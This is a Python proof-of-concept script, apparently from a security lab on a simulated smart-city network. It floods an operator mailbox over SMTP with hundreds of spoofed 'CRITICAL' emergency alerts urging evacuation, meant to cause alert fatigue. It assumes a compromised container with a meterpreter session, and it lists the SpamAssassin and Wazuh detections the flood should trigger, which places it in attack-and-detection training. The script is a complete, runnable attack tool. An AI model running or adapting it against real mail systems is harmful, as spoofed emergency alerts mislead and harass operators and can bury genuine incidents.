#!/usr/bin/env python3
"""
Threat 3 PoC: Email spam / alert flooding attack.
Simulates a compromised zone-aggregator (from Threat 2 APT) sending a flood of
fake CRITICAL alert emails to the operator mailbox to cause alert fatigue.

SpamAssassin detection: ALL_CAPS subject + urgency keywords score > threshold.
Wazuh detection: rule 100301 (10+ email_sent in 60s).

Run this from inside the compromised zone-aggregator-north container
(after establishing meterpreter session in Threat 2 PoC).

Usage:
    python3 poc/spam_attack.py --smtp <alert-service-ip> --port 25 --count 200
"""
import argparse
import smtplib
import time
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

parser = argparse.ArgumentParser(description="Spam PoC — alert email flood")
parser.add_argument("--smtp", default="localhost", help="SMTP server host (Postfix in alert-service)")
parser.add_argument("--port", type=int, default=25, help="SMTP port")
parser.add_argument("--from-addr", default="alerts@smartcity.local", help="Sender address")
parser.add_argument("--to-addr", default="operator@smartcity.local", help="Target mailbox")
parser.add_argument("--count", type=int, default=200, help="Number of spam emails to send")
parser.add_argument("--interval", type=float, default=0.3, help="Delay between emails (seconds)")
args = parser.parse_args()

SUBJECTS = [
    "[URGENT][NORTH] CRITICAL AIR QUALITY — EVACUATE NOW",
    "[URGENT][NORTH] CRITICAL TEMPERATURE SPIKE — SYSTEM FAILURE",
    "[URGENT][NORTH] CRITICAL NOISE LEVELS — INFRASTRUCTURE ALERT",
    "[CRITICAL][NORTH] ALL SENSORS DOWN — IMMEDIATE ACTION REQUIRED",
    "[ALERT][NORTH] HAZARDOUS AQI LEVEL — POPULATION AT RISK",
]

BODY_TEMPLATE = """SMART CITY EMERGENCY ALERT
==========================
Zone: NORTH (CRITICAL)
Sensor: ALL
Time: {ts}
Status: CRITICAL — IMMEDIATE OPERATOR RESPONSE REQUIRED

AQI: 487 (HAZARDOUS)
Temperature: 89.3°C (CRITICAL OVERLOAD)
Noise: 142 dB (STRUCTURAL DAMAGE RISK)

THIS IS AN AUTOMATED ALERT. DO NOT IGNORE.
Contact emergency services immediately.
Reference: ALERT-{ref:06d}
"""

print(f"[*] Spam PoC: flooding {args.to_addr} via {args.smtp}:{args.port}")
print(f"[*] Sending {args.count} emails at {1/args.interval:.1f}/s interval")
print(f"[*] SpamAssassin will score ALL_CAPS + urgency keywords -> X-Spam-Flag: YES")
print(f"[*] Wazuh rule 100301 fires at 10+ emails in 60s")

sent = 0
failed = 0

for i in range(1, args.count + 1):
    subject = SUBJECTS[i % len(SUBJECTS)]
    body = BODY_TEMPLATE.format(ts=datetime.utcnow().isoformat(), ref=i)

    msg = MIMEMultipart()
    msg["From"] = args.from_addr
    msg["To"] = args.to_addr
    msg["Subject"] = subject
    msg.attach(MIMEText(body, "plain"))

    try:
        with smtplib.SMTP(args.smtp, args.port, timeout=5) as server:
            server.sendmail(args.from_addr, [args.to_addr], msg.as_string())
        sent += 1
        if i % 10 == 0:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Sent {sent}/{args.count} emails")
    except Exception as e:
        failed += 1
        if failed <= 5:
            print(f"[!] Email {i} failed: {e}")

    time.sleep(args.interval)

print(f"\n[+] Done. Sent={sent}, Failed={failed}")
print(f"[+] Check Wazuh: rule 100301 (email flood)")
print(f"[+] Check Prometheus: alert_emails_total and alert_email_rate_per_min")
print(f"[+] Check mailbox: *****SPAM***** prefix on quarantined messages (SpamAssassin)")
